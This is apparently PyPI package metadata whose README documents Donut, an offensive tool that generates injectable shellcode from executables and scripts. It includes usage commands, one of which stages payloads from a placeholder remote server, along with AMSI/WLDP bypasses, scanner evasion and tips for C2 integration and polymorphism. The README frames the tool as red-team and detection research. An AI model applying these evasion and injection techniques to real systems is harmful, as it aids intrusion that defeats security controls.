{
    "0.9.2": {
        "info": {
            "author": "TheWover, Odzhan, byt3bl33d3r",
            "author_email": "",
            "bugtrack_url": null,
            "classifiers": [],
            "description": "# Using Donut\n\n![Alt text](https://github.com/TheWover/donut/blob/master/img/donut.PNG?raw=true \"An ASCII donut\")                                                                                                               \n\nVersion: 0.9.2 *please submit issues and requests for v1.0 release*\n\nOdzhan's blog post (about the generator): https://modexp.wordpress.com/2019/05/10/dotnet-loader-shellcode/\n\nTheWover's blog post (detailed walkthrough, and about how donut affects tradecraft): https://thewover.github.io/Introducing-Donut/\n\nv0.9.2 release blog post: https://thewover.github.io/Bear-Claw/\n\n## Introduction\n\nDonut generates x86 or x64 shellcode from VBScript, JScript, EXE, DLL (including .NET Assemblies) and XSL files. This shellcode can be injected into an arbitrary Windows processes for in-memory execution. Given a supported file type, parameters and an entry point where applicable (such as Program.Main), it produces position-independent shellcode that loads and runs entirely from memory. A module created by donut can either be staged from a URL or stageless by being embedded directly in the shellcode. Either way, the module is encrypted with the Chaskey block cipher and a 128-bit randomly generated key. After the file is loaded through the PE/ActiveScript/CLR loader, the original reference is erased from memory to deter memory scanners. For .NET Assemblies, they are loaded into a new Application Domain to allow for running Assemblies in disposable AppDomains.\n\nIt can be used in several ways.\n\n## As a Standalone Tool\n\nDonut can be used as-is to generate shellcode from VBS/JS/EXE/DLL/XSL files or .NET Assemblies. A Linux and Windows executable and a Python module are provided for payload generation. The Python documentation can be found [here](https://github.com/TheWover/donut/blob/master/docs/2019-08-21-Python_Extension.md). The command-line syntax is as described below.\n\n```\n\n usage: donut [options] -f <EXE/DLL/VBS/JS/XSL>\n\n                   -MODULE OPTIONS-\n\n       -f <path>            .NET assembly, EXE, DLL, VBS, JS or XSL file to execute in-memory.\n       -u <URL>             HTTP server that will host the donut module.\n\n                   -PIC/SHELLCODE OPTIONS-\n\n       -a <arch>            Target architecture : 1=x86, 2=amd64, 3=amd64+x86(default).\n       -b <level>           Bypass AMSI/WLDP : 1=skip, 2=abort on fail, 3=continue on fail.(default)\n       -o <payload>         Output file. Default is \"payload.bin\"\n\n                   -DOTNET OPTIONS-\n\n       -c <namespace.class> Optional class name.  (required for .NET DLL)\n       -m <method | api>    Optional method or API name for DLL. (method is required for .NET DLL)\n       -p <arg1,arg2...>    Optional parameters or command line, separated by comma or semi-colon.\n       -r <version>         CLR runtime version. MetaHeader used by default or v4.0.30319 if none available.\n       -d <name>            AppDomain name to create for .NET. Randomly generated by default.\n\n examples:\n\n    donut -f c2.dll\n    donut -a1 -cTestClass -mRunProcess -pnotepad.exe -floader.dll\n    donut -f loader.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe -u http://remote_server.com/modules/\n\n```\n\n### Building Donut\n\nTags have been provided for each release version of donut that contain the compiled executables. \n\n* v0.9.2, Bear Claw: \n* v0.9.2 Beta: https://github.com/TheWover/donut/releases/tag/v0.9.2\n* v0.9.1, Apple Fritter: https://github.com/TheWover/donut/releases/tag/v0.9.1\n* v0.9, Initial Release: https://github.com/TheWover/donut/releases/tag/v0.9\n\nHowever, you may also clone and build the source yourself using the provided makefiles. \n\n## Building From Repository\n\nFrom a Windows command prompt or Linux terminal, clone the repository and change to the donut directory.\n\n```\ngit clone http://github.com/thewover/donut\ncd donut\n```\n\n## Linux\n\nSimply run make to generate an executable, static and dynamic libraries.\n\n```\nmake\nmake clean\nmake debug\n```\n\n## Windows\n\nStart a Microsoft Visual Studio Developer Command Prompt and `` cd `` to donut's directory. The Microsft (non-gcc) Makefile can be specified with ``` -f Makefile.msvc ```. The makefile provides the following commmands to build donut:\n\n```\nnmake -f Makefile.msvc\nnmake clean -f Makefile.msvc\nnmake debug -f Makefile.msvc\n```\n\n## As a Library\n\ndonut can be compiled as both dynamic and static libraries for both Linux (*.a* / *.so*) and Windows(*.lib* / *.dll*). It has a simple API that is described in *docs/api.html*. Two exported functions are provided: ``` int DonutCreate(PDONUT_CONFIG c) ``` and ``` int DonutDelete(PDONUT_CONFIG c) ``` .\n\n## As a Python Module\n\nDonut can be installed and used as a Python module. To install Donut from your current directory, use pip for Python3.\n\n```\npip install .\n```\n\nOtherwise, you may install Donut as a Python module by grabbing it from the PyPi repostiory.\n\n```\npip install donut-shellcode\n```\n\n## As a Template - Rebuilding the shellcode\n\n*payload/* contains the in-memory loaders for PE/DLL/VBS/JS/XSL and .NET assemblies, which should successfully compile with both Microsoft Visual Studio and Mingw-w64. Make files have been provided for both compilers which will generate x86-64 shellcode by default unless x86 is supplied as a label to nmake/make. Whenever files in the payload directory have been changed, recompiling for all architectures is recommended before rebuilding donut.\n\n### Microsoft Visual Studio\n\n**Due to recent changes in the MSVC compiler, we now only support MSVC versions 2019 and later.**\n\nOpen the x64 Microsoft Visual Studio build environment, switch to the *payload* directory, and type the following:\n\n```\nnmake clean -f Makefile.msvc\nnmake -f Makefile.msvc\n```\n\nThis should generate a 64-bit executable (*payload.exe*) from *payload.c*. exe2h will then extract the shellcode from the *.text* segment of the PE file and save it as a C array to *payload_exe_x64.h*. When donut is rebuilt, this new shellcode will be used for all payloads that it generates.\n\nTo generate 32-bit shellcode, open the x86 Microsoft Visual Studio build environment, switch to the payload directory, and type the following:\n\n```\nnmake clean -f Makefile.msvc\nnmake x86 -f Makefile.msvc\n```\n\nThis will save the shellcode as a C array to *payload_exe_x86.h*.\n\n### Mingw-w64\n\nAssuming you're on Linux and *mingw-w64* has been installed from packages or source, you may still rebuild the shellcode using our provided makefile. Change to the *payload* directory and type the following:\n\n```\nmake clean -f Makefile.mingw\nmake -f Makefile.mingw\n```\n\nOnce you've recompiled for all architectures, you may rebuild donut.\n\n## Bypasses\n\nDonut includes a bypass system for AMSI and other security features. Currently we bypass:\n\n* AMSI in .NET v4.8\n* Device Guard policy preventing dynamicly generated code from executing\n\nYou may customize our bypasses or add your own. The bypass logic is defined in payload/bypass.c.\n\nEach bypass implements the DisableAMSI fuction with the signature ```BOOL DisableAMSI(PDONUT_INSTANCE inst)```, and comes with a corresponding preprocessor directive. We have several ```#if defined``` blocks that check for definitions. Each block implements the same bypass function. For instance, our first bypass is called ```BYPASS_AMSI_A```. If donut is built with that variable defined, then that bypass will be used.\n\nWhy do it this way? Because it means that only the bypass you are using is built into payload.exe. As a result, the others are not included in your shellcode. This reduces the size and complexity of your shellcode, adds modularity to the design, and ensures that scanners cannot find suspicious blocks in your shellcode that you are not actually using.\n\nAnother benefit of this design is that you may write your own AMSI bypass. To build Donut with your new bypass, use an ```if defined``` block for your bypass and modify the makefile to add an option that builds with the name of your bypass defined.\n\nIf you wanted to, you could extend our bypass system to add in other pre-execution logic that runs before your .NET Assembly is loaded. \n\nOdzhan wrote a [blog post](https://modexp.wordpress.com/2019/06/03/disable-amsi-wldp-dotnet/) on the details of our AMSI bypass research.\n\n### Additional features.\n\nThese are left as exercises to the reader. I would personally recommend:\n\n* Add environmental keying\n* Make donut polymorphic by obfuscating *payload* every time shellcode is generated\n* Integrate donut as a module into your favorite RAT/C2 Framework\n\n## Disclaimers\n\n* No, we will not update donut to counter signatures or detections by any AV.\n* We are not responsible for any misuse of this software or technique. Donut is provided as a demonstration of CLR Injection through shellcode in order to provide red teamers a way to emulate adversaries and defenders a frame of reference for building analytics and mitigations. This inevitably runs the risk of malware authors and threat actors misusing it. However, we believe that the net benefit outweighs the risk. Hopefully that is correct.\n\n# How it works\n\n## Procedure for Assemblies\n\nDonut uses the Unmanaged CLR Hosting API to load the Common Language Runtime. If necessary, the Assembly is downloaded into memory. Either way, it is decrypted using the Chaskey block cipher. Once the CLR is loaded into the host process, a new AppDomain will be created using a random name unless otherwise specified. Once the AppDomain is ready, the .NET Assembly is loaded through AppDomain.Load_3. Finally, the Entry Point specified by the user is invoked with any specified parameters.\n\nThe logic above describes how the shellcode generated by donut works. That logic is defined in *payload.exe*. To get the shellcode, *exe2h* extracts the compiled machine code from the *.text* segment in *payload.exe* and saves it as a C array to a C header file. *donut* combines the shellcode with a Donut Instance (a configuration for the shellcode) and a Donut Module (a structure containing the .NET assembly, class name, method name and any parameters).\n\nRefer to MSDN for documentation on the Undocumented CLR Hosting API: https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/clr-hosting-interfaces\n\nFor a standalone example of a CLR Host, refer to Casey Smith's AssemblyLoader repo: https://github.com/caseysmithrc/AssemblyLoader\n\nDetailed blog posts about how donut works are available at both Odzhan's and TheWover's blogs. Links are at the top of the README.\n\n## Procedure for ActiveScript/XSL\n\nThe details of how Donut loads scripts and XSL files from memory have been detailed by Odzhan in a [blog post](https://modexp.wordpress.com/2019/07/21/inmem-exec-script/).\n\n## Procedure for PE Loading\n\nThe details of how Donut loads PE files from memory have been detailed by Odzhan in a [blog post](https://modexp.wordpress.com/2019/06/24/inmem-exec-dll/).\n\n## Components\n\nDonut contains the following elements:\n\n* donut.c: The source code for the donut payload generator\n* donut.exe: The compiled payload generator as an EXE\n* donut.py: The donut payload generator as a Python script *(planned for version 1.0)*\n* donutmodule.c: The CPython wrapper for Donut. Used by the Python module.\n* setup.py: The setup file for installing Donut as a Pip Python3 module.\n* lib/donut.dll, lib/donut.lib: Donut as a dynamic and static library for use in other projects on Windows platform\n* lib/donut.so, lib/donut.a: Donut as a dynamic and static library for use in other projects on the Linux platform\n* lib/donut.h: Header file to include if using the static or dynamic libraries in a C/C++ project\n* payload/payload.c: Main file for the shellcode.\n* payload/inmem_dotnet.c: In-Memory loader for .NET EXE/DLL assemblies.\n* payload/inmem_pe.c: In-Memory loader for EXE/DLL files.\n* payload/inmem_xml.c: In-Memory loader for XSL/XML files.\n* payload/inmem_script.c: In-Memory loader for VBScript/JScript files.\n* payload/activescript.c: ActiveScriptSite interface required for in-memory execution of VBS/JS files.\n* payload/wscript.c: Supports a number of WScript methods that cscript/wscript support.\n* payload/bypass.c: Functions to bypass Anti-malware Scan Interface (AMSI) and Windows Local Device Policy (WLDP)\n* payload/http_client.c: Downloads a module from remote staging server into memory.\n* payload/peb.c: Used to resolve the address of DLL functions via Process Environment Block (PEB).\n* payload/clib.c: Replaces common C library functions like memcmp, memcpy and memset.\n* payload/inject.exe: The compiled C shellcode injector\n* payload/inject.c: A C shellcode injector that injects payload.bin into a specified process for testing.\n* payload/runsc.c: A C shellcode runner for testing payload.bin in the simplest manner possible\n* payload/runsc.exe: The compiled C shellcode runner\n* payload/exe2h/exe2h.c: Source code for exe2h\n* payload/exe2h/exe2h.exe: Extracts the useful machine code from payload.exe and saves as array to C header file\n* encrypt.c: Chaskey 128-bit block cipher in Counter (CTR) mode used for encryption.\n* hash.c: Maru hash function. Uses the Speck 64-bit block cipher with Davies-Meyer construction for API hashing.\n\n# Subprojects\n\nThere are three companion projects provided with donut:\n\n* DemoCreateProcess: A sample .NET Assembly to use in testing. Takes two command-line parameters that each specify a program to execute.\n* DonutTest: A simple C# shellcode injector to use in testing donut. The shellcode must be base64 encoded and copied in as a string. \n* ModuleMonitor: A proof-of-concept tool that detects CLR injection as it is done by tools such as donut and Cobalt Strike's execute-assembly.\n* ProcessManager: A Process Discovery tool that offensive operators may use to determine what to inject into and defensive operators may use to determine what is running, what properties those processes have, and whether or not they have the CLR loaded. \n\n# Project plan\n\n* ~~Create a donut Python C extension that allows users to write Python programs that can use the donut API programmatically. It would be written in C, but exposed as a Python module.~~\n* Create a C# version of the generator.\n* Create a donut.py generator that uses the same command-line parameters as donut.exe.\n* Add support for HTTP proxies.\n~~* Find ways to simplify the shellcode if possible.~~\n* Write a blog post on how to integrate donut into your tooling, debug it, customize it, and design payloads that work with it.\n* ~~Dynamic Calls to DLL functions.~~\n* Handle the ProcessExit event from AppDomain using unmanaged code.",
            "description_content_type": "text/markdown",
            "docs_url": null,
            "download_url": "",
            "downloads": {
                "last_day": -1,
                "last_month": -1,
                "last_week": -1
            },
            "home_page": "https://github.com/TheWover/donut",
            "keywords": "",
            "license": "",
            "maintainer": "",
            "maintainer_email": "",
            "name": "donut-shellcode",
            "package_url": "https://pypi.org/project/donut-shellcode/",
            "platform": "",
            "project_url": "https://pypi.org/project/donut-shellcode/",
            "project_urls": {
                "Homepage": "https://github.com/TheWover/donut"
            },
            "release_url": "https://pypi.org/project/donut-shellcode/0.9.2/",
            "requires_dist": null,
            "requires_python": ">=3.0",
            "summary": "Donut Python C extension",
            "version": "0.9.2",
            "yanked": false,
            "yanked_reason": null
        },
        "last_serial": 5784785,
        "urls": [
            {
                "comment_text": "",
                "digests": {
                    "md5": "997898771f74fdec327f5fedbaee3c99",
                    "sha256": "85c6ddfc1370657779bdcb0564dd4f194f9fa10cae22f537d47857ee277b110d"
                },
                "downloads": -1,
                "filename": "donut-shellcode-0.9.2.tar.gz",
                "has_sig": false,
                "md5_digest": "997898771f74fdec327f5fedbaee3c99",
                "packagetype": "sdist",
                "python_version": "source",
                "requires_python": ">=3.0",
                "size": 149690,
                "upload_time": "2019-09-05T05:21:13",
                "upload_time_iso_8601": "2019-09-05T05:21:13.466778Z",
                "url": "https://files.pythonhosted.org/packages/21/d9/443a166c53af55f16f7b1ce2680fa1599e2dcd9aee0ceb342d77db77df2b/donut-shellcode-0.9.2.tar.gz",
                "yanked": false,
                "yanked_reason": null
            }
        ],
        "vulnerabilities": []
    }
}